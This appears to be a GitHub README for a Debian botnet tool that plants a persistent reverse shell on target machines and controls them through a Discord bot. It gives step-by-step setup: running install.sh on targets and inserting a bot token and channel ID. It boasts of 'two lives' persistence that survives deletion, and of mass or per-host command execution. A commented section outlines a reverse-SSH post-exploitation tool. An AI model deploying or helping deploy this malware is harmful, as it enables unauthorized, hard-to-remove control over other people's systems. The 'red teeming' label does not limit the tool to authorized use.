# Spider_shell_reshell_botnet
This tool is use for red teeming  and its use in botnet attack on a system it give you reverse shell of your target system and communicate through discord API . this file can be run on many different machin and give you there all control you can give command once to all botnet or  give command to specific one botnet get rce from cli or discord 
<h2> importent note : this tool botnet cant't be deleted easly  unless your target reset os even he find out botnet file and delet everything I must say this botnet qulified for regain system control just after reboot [it have two lives] if any skilled user figer out to kill first live it have second one ;) </h2>

<h1>Easy way to delet this botnet is know about this repo :) </h1>

[ hold on i am working for windos os to and mac ]

info : this is total based on  Debian operating system its a BotNET project taking Remode code excution (rec) from any  Debian operating system using a discord api ... for use it you need to have discord account and a bot added tou any of your server take your bot token and channel id and downloade the script name ( install.sh) and run it ./install.sh or bash ./install.sh ( chmod +x install.sh) then 

You get this in mid of running script 

 " i pested my discord bot token = yes or no > " when script ask for this look to your current folder location there is folder name  ( the_spider_shell_reshell ) open and look for " Bnet/bnet.py " open bnet.py file and at thr bottom of file function name " client.run("YOUR BOT TOKEN HERE") " line 66 put your bot token here for getting connection there and next see abofe in file
 line 19 " channel = client.get_channel(1038778150903087126)  " copy your channel id and pest here see in bnet.py file you understend ( right click on "general" option in discord server and select copy link and the last long number is your id pest in bnet.py as shown thats  it save file ;0

 last step is in your terminal emulator " i pested my discord bot token = yes or no > " here type "yes" and enter done wait for script done it's  job 


 after it done you get a message from your bot on discord sever saing " host-name is online " now you can enter any command you want it excute in Debian operating system  and show result 

 YOU CAN UE ANY COMMAND YOU KNOW ABOUT EX .ls ,pwd ,cd or any bash envorment supporting commands

 <h1>Here are best thing about this tool </h1>
 <p>1. you can run this script to any number of system more then 10k or ++ you will gget all the system acess from your discord        derver
  
 2. you can run a command to all system at onse and you can run specific commands on perticular system you get message when system connected to internet ( use command : #help for more info)

3. this will work like bots which excute any command to there host pre-define commands are (  #show targets , #execute host commands , #notes )
4. for running any command just send the command as message to discord server where you added a bot and provide bot token ex. send message 'ls' it list all the file and folder to all the system you use this tool
5.  for give a perticular command to particular system enter > #show targets
and select target and enter as message to discord sever >> ls #host-name display from #show targets  command

5 . it's very easy to use  just take 'install.sh' file to any system  and run thats it you get connection over WAN 
and do add discord bot tocken and channel id that's it ;)

 </p> 
 <!--
-----------------------------------------------
<h1>Another tool in this repo is reverse_ssh over WAN</h1>
<p>
    <h7>  os supports  linux </h7>
 <h3>  [ it can be use as Post-exploitation ] </h3>
 <h5>
   prerequisites for this tool to set up <br>
     1. ) you need to get a physical acess of system  for set things up there  <br>
     2. ) get a root acess and note user name for ssh ( not user=root Ex kali , sage㉿darksage here 'sage' is user ) <br>
     3. ) download file according to your os linux : reverse_ssh.s , windos : reverse_ssh.ps1 <br>
           &nbsp;&nbsp;&nbsp;now do : chmod +x reverse_ssh.sh ( give permision to your file )<br>
           &nbsp;&nbsp;&nbsp; run the file as root user or Administrator <br>
           
 </h5>
</p>
-->
